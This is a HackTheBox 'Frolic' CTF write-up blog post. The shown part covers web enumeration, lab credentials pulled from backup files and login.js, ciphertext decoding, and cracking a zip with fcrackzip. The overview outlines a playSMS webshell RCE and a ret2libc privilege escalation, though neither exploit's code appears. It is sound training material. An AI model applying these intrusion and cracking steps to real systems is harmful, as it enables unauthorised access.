<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="HackTheBox - Frolic" /><meta property="og:locale" content="en" /><meta name="description" content="Overview This machine begins w/ a thorough web enumeration, discovering several directories that contains necessary information to proceed." /><meta property="og:description" content="Overview This machine begins w/ a thorough web enumeration, discovering several directories that contains necessary information to proceed." /><link rel="canonical" href="https://yufongg.github.io/posts/Frolic/" /><meta property="og:url" content="https://yufongg.github.io/posts/Frolic/" /><meta property="og:site_name" content="Yufong" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-21T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox - Frolic" /><meta name="twitter:site" content="@yufongg" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-06-09T02:05:28+08:00","datePublished":"2022-09-21T00:00:00+08:00","description":"Overview This machine begins w/ a thorough web enumeration, discovering several directories that contains necessary information to proceed.","headline":"HackTheBox - Frolic","mainEntityOfPage":{"@type":"WebPage","@id":"https://yufongg.github.io/posts/Frolic/"},"url":"https://yufongg.github.io/posts/Frolic/"}</script><title>HackTheBox - Frolic | Yufong</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Yufong"><meta name="application-name" content="Yufong"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Bob 1.0.1/images/koko.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Yufong</a></div><div class="site-subtitle font-italic">OSCP | Infosec Writeups</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/yufongg" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.youtube.com/watch?v=7hjHZOc-e4w" aria-label="youtube" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="http://discordapp.com/users/175250797578158080" aria-label="discord" target="_blank" rel="noopener"> <i class="fab fa-discord"></i> </a> <a href="https://www.hackthebox.com/home/users/profile/834331" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fa fa-cube"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox - Frolic</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Frolic/images/Pasted%20image%2020220920200545.png" class="preview-img bg" alt="Preview Image" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>HackTheBox - Frolic</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/yufongg">yufongg</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1663689600" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-09-21 </em> </span> <span> Updated <em class="timeago" data-ts="1749405928" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2025-06-09 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3254 words"> <em>18 min</em> read</span></div></div></div><div class="post-content"><h1 id="overview">Overview</h1><p>This machine begins w/ a thorough web enumeration, discovering several directories that contains necessary information to proceed.</p><p>Directory <code class="language-plaintext highlighter-rouge">/admin</code> contains a login page that is coded w/ <code class="language-plaintext highlighter-rouge">javascript</code>, viewing the source code reveals credentials. After successfully logging in, we are redirected to <code class="language-plaintext highlighter-rouge">success.html</code>, containing a ciphertext. It can be decrypted w/ a encryption called <code class="language-plaintext highlighter-rouge">OOK!</code>, revealing another directory <code class="language-plaintext highlighter-rouge">/asdiSIAJJ0QWE9JAS</code>.</p><p>Directory <code class="language-plaintext highlighter-rouge">/asdiSIAJJ0QWE9JAS</code> contains a ciphertext. It can be decrypted w/ <code class="language-plaintext highlighter-rouge">base64</code>, revealing an zip file w/ <code class="language-plaintext highlighter-rouge">password</code> as its password. Unzipping it reveals another ciphertext that can be decrypted after <code class="language-plaintext highlighter-rouge">hex decode -&gt; base64 decode -&gt; unbrainfuck</code>, revealing a password <code class="language-plaintext highlighter-rouge">idkwhatispass</code>.</p><p>Directory <code class="language-plaintext highlighter-rouge">/dev</code>, after directory enumerating it, reveals a directory <code class="language-plaintext highlighter-rouge">/backup</code> that reveals another directory <code class="language-plaintext highlighter-rouge">playSMS</code>. w/ the credentials obtained from earlier, we are able to login. <code class="language-plaintext highlighter-rouge">playSMS</code> is vulnerable to a RCE exploit, due to improper file contents handling in <code class="language-plaintext highlighter-rouge">import.php</code>, attackers can upload <code class="language-plaintext highlighter-rouge">.csv</code> file w/ a webshell, allowing us to obtain a low-privilege/<code class="language-plaintext highlighter-rouge">www-data</code> user.</p><p>For the privilege escalation part, after enumerating the system, there is a binary w/ SUID bit set. It is susceptible to a bufferoverflow exploit due to using <code class="language-plaintext highlighter-rouge">strcpy</code>. By doing a <code class="language-plaintext highlighter-rouge">ret2libc</code> attack, we are able to privilege escalate to <code class="language-plaintext highlighter-rouge">root</code>.</p><p>If you wish to practice Linux Buffer Overflow try</p><ul><li><a href="https://yufongg.github.io/posts/Node/#privilege-escalation---7-bof">HackTheBox Node</a><li>Vulnhub Tr0ll 2<li>Overthewire Narnia 2,3,4</ul><hr /><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Box Name<td>Frolic<tr><td>IP<td>10.10.10.111<tr><td>Points<td>20<tr><td>Difficulty<td>Easy<tr><td>Creator<td><a href="https://www.hackthebox.com/home/users/profile/27390">felamos</a><tr><td>Release Date<td>13 Oct 2018</table></div><h1 id="recon">Recon</h1><h2 id="tcp1880-http">TCP/1880 (HTTP) <a href="#tcp1880-http" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>FFUF<div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>  favicon.ico             <span class="o">[</span>Status: 200, Size: 16958, Words: 5, Lines: 5, Duration: 44ms]
  flows                   <span class="o">[</span>Status: 401, Size: 12, Words: 1, Lines: 1, Duration: 47ms]
  icons                   <span class="o">[</span>Status: 401, Size: 12, Words: 1, Lines: 1, Duration: 40ms]
  red                     <span class="o">[</span>Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 40ms]
  settings                <span class="o">[</span>Status: 401, Size: 12, Words: 1, Lines: 1, Duration: 41ms]
  vendor                  <span class="o">[</span>Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 38ms]
  :: Progress: <span class="o">[</span>4615/4615] :: Job <span class="o">[</span>1/1] :: 972 req/sec :: Duration: <span class="o">[</span>0:00:05] :: Errors: 0 ::
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">flows</code><li><code class="language-plaintext highlighter-rouge">red</code><li><code class="language-plaintext highlighter-rouge">settings</code><li><code class="language-plaintext highlighter-rouge">vendor</code></ul></ul><h2 id="tcp9999-http">TCP/9999 (HTTP) <a href="#tcp9999-http" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>FFUF<div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>  admin                   <span class="o">[</span>Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 40ms]
  backup                  <span class="o">[</span>Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 45ms]
  dev                     <span class="o">[</span>Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 36ms]
  <span class="nb">test</span>                    <span class="o">[</span>Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 42ms]
  :: Progress: <span class="o">[</span>4615/4615] :: Job <span class="o">[</span>1/1] :: 1066 req/sec :: Duration: <span class="o">[</span>0:00:04] :: Errors: 0 ::
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">admin</code><li><code class="language-plaintext highlighter-rouge">backup</code><li><code class="language-plaintext highlighter-rouge">dev</code><li><code class="language-plaintext highlighter-rouge">test</code></ul></ul><h2 id="tcp139445-smb">TCP/139,445 (SMB) <a href="#tcp139445-smb" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>SMBMAP<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>  ┌──(root💀kali)-[~/htb/frolic]
  └─# smbmap -H frolic.htb
  [+] Guest session       IP: frolic.htb:445      Name: unknown 
  Disk           Permissions     Comment
  ----           -----------     -------
  print$         NO ACCESS       Printer Drivers
  IPC$           NO ACCESS       IPC Service (frolic server (Samba, Ubuntu))
</pre></table></code></div></div></ul><h1 id="initial-foothold---1">Initial Foothold - 1</h1><h2 id="tcp1880-http---node-red-login-page">TCP/1880 (HTTP) - Node-Red Login Page <a href="#tcp1880-http---node-red-login-page" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Found a <code class="language-plaintext highlighter-rouge">Node-RED</code> login page at <code class="language-plaintext highlighter-rouge">http://frolic.htb:1880/</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Frolic/images/Pasted%20image%2020220920233921.png" alt="" data-proofer-ignore><li>Could not find any exploits from <code class="language-plaintext highlighter-rouge">searchsploit</code></ol><h2 id="tcp9999-http---test-playsms-login-page">TCP/9999 (HTTP) - /test, playSMS Login Page <a href="#tcp9999-http---test-playsms-login-page" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Directory enumerate <code class="language-plaintext highlighter-rouge">http://frolic.htb/dev/FUZZ</code><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> backup                  <span class="o">[</span>Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 45ms]
 <span class="nb">test</span>                    <span class="o">[</span>Status: 200, Size: 5, Words: 1, Lines: 2, Duration: 37ms]
</pre></table></code></div></div><li>View enumerated files/directories<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/frolic]
 └─# curl http://frolic.htb:9999/dev/backup/
 /playsms
	
 ┌──(root💀kali)-[~/htb/frolic]
 └─# curl http://frolic.htb:9999/dev/test
 test
</pre></table></code></div></div><li>Found a login page at <code class="language-plaintext highlighter-rouge">http://frolic.htb/playsms</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Frolic/images/Pasted%20image%2020220920233513.png" alt="" data-proofer-ignore></ol><h2 id="tcp9999-http---backup-found-credentials">TCP/9999 (HTTP) - /backup, Found credentials <a href="#tcp9999-http---backup-found-credentials" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>View <code class="language-plaintext highlighter-rouge">http://frolic.htb:9999/backup</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot/backup]
└─# curl http://frolic.htb:9999/backup/
password.txt
user.txt
loop/
</pre></table></code></div></div><li>Download the files<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot/backup]
 └─# wget http://frolic.htb:9999/backup/user.txt
	
 ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot/backup]
 └─# wget http://frolic.htb:9999/backup/password.txt
	
 ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot/backup]
 └─# cat *.txt
 password - imnothuman
 user - admin
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">admin:imnothuman</code></ul><li>Directory enumerate <code class="language-plaintext highlighter-rouge">loop/</code> - Nothing interesting found</ol><h2 id="tcp9999-http---admin-a-vulnerable-login-page--decrypt-ciphertext">TCP/9999 (HTTP) - /admin, A vulnerable login page + Decrypt Ciphertext <a href="#tcp9999-http---admin-a-vulnerable-login-page--decrypt-ciphertext" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Found a login page at <code class="language-plaintext highlighter-rouge">http://frolic.htb:9999/admin</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Frolic/images/Pasted%20image%2020220920233542.png" alt="" data-proofer-ignore><li>There are a few vulnerabilities on login page at <code class="language-plaintext highlighter-rouge">http://frolic.htb:9999/admin</code>,<ul><li>The source code of the login page (<code class="language-plaintext highlighter-rouge">login.js</code>) is exposed.<li>The login page is loading a javascript <code class="language-plaintext highlighter-rouge">login.js</code> that checks whether the fields in form submitted is valid.<li>The credentials are hardcoded</ul><li>View <code class="language-plaintext highlighter-rouge">login.js</code><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre> <span class="kd">var</span> <span class="nx">attempt</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span> <span class="c1">// Variable to count number of attempts.</span>
 <span class="c1">// Below function Executes on click of login button.</span>
 <span class="kd">function</span> <span class="nx">validate</span><span class="p">(){</span>
 <span class="kd">var</span> <span class="nx">username</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
 <span class="kd">var</span> <span class="nx">password</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">password</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
 <span class="k">if</span> <span class="p">(</span> <span class="nx">username</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span> <span class="o">&amp;&amp;</span> <span class="nx">password</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">superduperlooperpassword_lol</span><span class="dl">"</span><span class="p">){</span>
 <span class="nx">alert</span> <span class="p">(</span><span class="dl">"</span><span class="s2">Login successfully</span><span class="dl">"</span><span class="p">);</span>
 <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">success.html</span><span class="dl">"</span><span class="p">;</span> <span class="c1">// Redirecting to other page.</span>
 <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
 <span class="p">}</span>
 <span class="k">else</span><span class="p">{</span>
 <span class="nx">attempt</span> <span class="o">--</span><span class="p">;</span><span class="c1">// Decrementing by one.</span>
 <span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">You have left </span><span class="dl">"</span><span class="o">+</span><span class="nx">attempt</span><span class="o">+</span><span class="dl">"</span><span class="s2"> attempt;</span><span class="dl">"</span><span class="p">);</span>
 <span class="c1">// Disabling fields after 3 attempts.</span>
 <span class="k">if</span><span class="p">(</span> <span class="nx">attempt</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
 <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">).</span><span class="nx">disabled</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
 <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">password</span><span class="dl">"</span><span class="p">).</span><span class="nx">disabled</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
 <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">submit</span><span class="dl">"</span><span class="p">).</span><span class="nx">disabled</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
 <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
 <span class="p">}</span>
 <span class="p">}</span>
 <span class="p">}</span>
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">admin:superduperlooperpassword_lol</code></ul><li>Redirected to <code class="language-plaintext highlighter-rouge">http://frolic.htb:9999/success.html</code>, contains an unknown text<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot]
 └─# curl http://frolic.htb:9999/admin/success.html
 ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... .....
 ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... .....
 ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! .....
 ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!!
 !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... .....
 ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?.
 ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... .....
 ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... .....
 ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!!
 !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!!
 !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?!
 .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?..
 !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?.
 ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.?
 !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!!
 !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!!
 !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. .....
 ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!!
 !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!!
 !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .....
 ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! .....
 ..!.! !!!!! !.?.
</pre></table></code></div></div><li>Identify the ciphertext w/ <a href="https://www.dcode.fr/cipher-identifier">dcode</a> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Frolic/images/Pasted%20image%2020220920210344.png" alt="" data-proofer-ignore><ul><li><a href="https://www.dcode.fr/ook-language">Ook!</a> - A rewriting of brainfuck, designed to be readable by orangutans</ul><li>Decrypt it<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> /asdiSIAJJ0QWE9JAS
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Frolic/images/Pasted%20image%2020220920210443.png" alt="" data-proofer-ignore></p></ol><h2 id="tcp9999-http---asdisiajj0qwe9jas-ciphertext-found--decrypt-ciphertext">TCP/9999 (HTTP) - /asdiSIAJJ0QWE9JAS, Ciphertext found + Decrypt Ciphertext <a href="#tcp9999-http---asdisiajj0qwe9jas-ciphertext-found--decrypt-ciphertext" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Found another ciphertext at <code class="language-plaintext highlighter-rouge">http://frolic.htb:9999/asdiSIAJJ0QWE9JAS/</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot/asd]
 └─# curl http://frolic.htb:9999/asdiSIAJJ0QWE9JAS/
 UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB
 BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs
 K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve
 EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj
 lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC
 AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG
 AAAAAAEAAQBPAAAAAwEAAAAA
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">base64</code></ul><li><code class="language-plaintext highlighter-rouge">Base64</code> decode it,<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot/asd]
 └─# cat index.html | base64 -d &gt; file
</pre></table></code></div></div><li>Find out what type of file it is<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot/asd]
 └─# cat index.html | base64 -d &gt; file
	
 ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot/asd]
 └─# file file
 file: Zip archive data, at least v2.0 to extract, compression method=deflate
</pre></table></code></div></div><ul><li>zip archive</ul><li>Crack the archive w/ <code class="language-plaintext highlighter-rouge">fcrackzip</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/frolic/10.10.10.111/loot/asd]
 └─# fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt file
 found file 'index.php', (size cp/uc    176/   617, flags 9, chk 89c3)
	
	
 PASSWORD FOUND!!!!: pw == password
